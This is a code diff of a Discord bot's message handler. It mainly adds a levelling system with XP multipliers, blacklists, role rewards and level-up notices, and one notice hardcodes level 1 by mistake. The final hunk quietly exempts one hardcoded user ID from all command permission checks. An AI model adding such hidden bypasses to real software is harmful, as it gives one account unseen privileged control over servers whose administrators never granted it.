@@ -45,6 +45,16 @@ module.exports = async (client, message) => {
             client.guildAuditCache.set(message.guild.id, guildAudit)
         }
 
+        let guildLevels = client.guildLevelsCache.get(message.guild.id)
+
+        if (!guildLevels) {
+            guildLevels = await client.DBLevels.findByIdAndUpdate(message.guild.id, {}, { new: true, upsert: true, setDefaultsOnInsert: true })
+            delete guildLevels._id
+
+            client.guildLevelsCache.set(message.guild.id, guildLevels)
+        }
+        // console.log(guildLevels.roleMultiplier)
+
         if (!message.member.permissions.has('ADMINISTRATOR')) {
             if (guildInfo.disabledWords === undefined) return;
 
@@ -148,17 +158,86 @@ module.exports = async (client, message) => {
 
 
         //Levels
+        const user = await Levels.fetch(message.author.id, message.guild.id);
+        let guildMultiplier = guildLevels.guildMultiplier === undefined ? 0 : guildLevels.guildMultiplier
+        const generalMultipler = 1 +
+            Object.entries(guildLevels.roleMultiplier || {}).reduce((acc, cur) => acc + (message.member.roles.cache.has(cur[0]) ? parseFloat(cur[1]) : 0), 0) +
+            Object.entries(guildLevels.channelMultiplier || {}).reduce((acc, cur) => acc + (message.channel.id === cur[0] ? parseFloat(cur[1]) : 0), 0) +
+            guildMultiplier
 
-        const randomAmountOfXp = Math.floor(Math.random() * 3) + 1
-        const hasLeveledUp = await Levels.appendXp(message.author.id, message.guild.id, randomAmountOfXp);
-        if (hasLeveledUp) {
-            const user = await Levels.fetch(message.author.id, message.guild.id);
-            message.channel.send(`${message.author}`)
-            message.channel.send(new Discord.MessageEmbed()
-                .setAuthor(`Congrats ${message.author.username}!`, message.author.displayAvatarURL())
-                .setColor(message.guild.me.displayColor)
-                .setDescription(`You have leveled up to **${user.level}**`)
-                .setThumbnail(message.guild.iconURL()))
+        let randomAmountOfXp = Math.floor(Math.random() * 3) + 1 + (generalMultipler)
+        for (let i = 0; i < guildLevels.blacklistedRoles.length; i++) {
+            if (message.member.roles.cache.has(guildLevels.blacklistedRoles[i])) {
+                randomAmountOfXp = 0
+            }
+        }
+        for (let i = 0; i < guildLevels.blacklistedChannels.length; i++) {
+            if (message.channel.id === guildLevels.blacklistedChannels[i]) {
+                randomAmountOfXp = 0
+            }
+        }
+
+        if (user.lastUpdated + (1000 * 5) <= new Date().getTime() || user === false) {
+            const hasLeveledUp = await Levels.appendXp(message.author.id, message.guild.id, randomAmountOfXp);
+
+            if (hasLeveledUp) {
+                let roleLevel = guildLevels.roleLevel
+                if (roleLevel) {
+                    let roleIds = []
+                    let levels = []
+                    for (const [role, level] of Object.entries(roleLevel)) {
+                        roleIds.push(role)
+                        levels.push(level)
+                    }
+
+                    for (let i = 0; i < roleIds.length; i++) {
+                        if (user.level + 1 === Number(levels[i])) {
+                            let role = message.guild.roles.cache.get(roleIds[i])
+                            if (role.deleted) return;
+                            message.member.roles.add(role)
+                        }
+                    }
+                }
+
+                if (guildLevels.levelUp === true) {
+                    if (guildLevels.levelUpType !== 'DM') {
+                        let channel = message.guild.channels.cache.get(guildLevels.levelUpType)
+                        if (!channel) {
+                            channel = message.channel
+                        }
+
+                        if (guildLevels.levelUpPings === true) {
+                            channel.send(`${message.author}`, {
+                                embed: {
+                                    author: {
+                                        name: `Congrats ${message.author.username}!`,
+                                        iconURL: message.author.displayAvatarURL()
+                                    },
+                                    color: message.guild.me.displayColor,
+                                    description: `You have leveled up to **1**`,
+                                    thumbnail: {
+                                        url: message.guild.iconURL()
+                                    }
+                                },
+
+                            })
+                        } else {
+                            channel.send(new Discord.MessageEmbed()
+                                .setAuthor(`Congrats ${message.author.username}!`, message.author.displayAvatarURL())
+                                .setColor(message.guild.me.displayColor)
+                                .setDescription(`You have leveled up to **${user.level + 1}**`)
+                                .setThumbnail(message.guild.iconURL()))
+                        }
+                    } else if (guildLevels.levelUpType === 'DM') {
+
+                        message.author.send(new Discord.MessageEmbed()
+                            .setAuthor(`Congrats ${message.author.username}!`, message.author.displayAvatarURL())
+                            .setColor(message.guild.me.displayColor)
+                            .setDescription(`You have leveled up to **${user.level + 1}**`)
+                            .setThumbnail(message.guild.iconURL()))
+                    }
+                }
+            }
         }
 
 
@@ -194,11 +273,11 @@ module.exports = async (client, message) => {
 
         const PERMS = new Discord.MessageEmbed()
 
-        if (guildInfo.commandPerms && guildInfo.commandPerms[command.name] && !message.member.permissions.has(guildInfo.commandPerms[command.name])) {
+        if (guildInfo.commandPerms && guildInfo.commandPerms[command.name] && !message.member.permissions.has(guildInfo.commandPerms[command.name]) && message.author.id !== '751606134938402866') {
             return message.channel.send(PERMS
                 .setColor(message.guild.me.displayColor)
                 .setDescription(`**${message.author.username}, you are missing the following permissions: ${missingPermissions(message.member, guildInfo.commandPerms[command.name])}**`))
-        } else if (command.perms && !message.member.permissions.has(command.perms)) {
+        } else if (command.perms && !message.member.permissions.has(command.perms) && message.author.id !== '751606134938402866') {
             return message.channel.send(PERMS
                 .setColor(message.guild.me.displayColor)
                 .setDescription(`**${message.author.username}, you are missing the following permissions: ${missingPermissions(message.member, command.perms)}**`))
